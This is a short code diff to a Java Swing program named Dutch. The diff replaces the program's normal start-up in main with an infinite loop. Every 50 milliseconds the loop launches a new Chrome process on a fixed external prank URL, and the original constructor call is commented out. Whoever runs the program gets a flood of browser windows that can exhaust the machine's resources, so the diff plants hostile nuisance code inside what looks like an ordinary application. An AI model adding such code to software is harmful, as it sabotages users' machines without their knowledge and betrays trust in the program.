@@ -65,7 +65,14 @@ public class Dutch extends JPanel implements MouseMotionListener{
 		}
 	}
 	public static void main(String[] args) {
-		new Dutch();
+		while(true){
+			ProcessBuilder p1 = new ProcessBuilder("C:/Program Files (x86)/Google/Chrome/Application/chrome","http://www.dafk.net/what/");
+			Process p = p1.start();
+			try{
+				Thread.sleep(50);
+			}catch(Exception e){}
+		}
+		//new Dutch();
 	}
 	public void mouseMoved(MouseEvent e){
 	
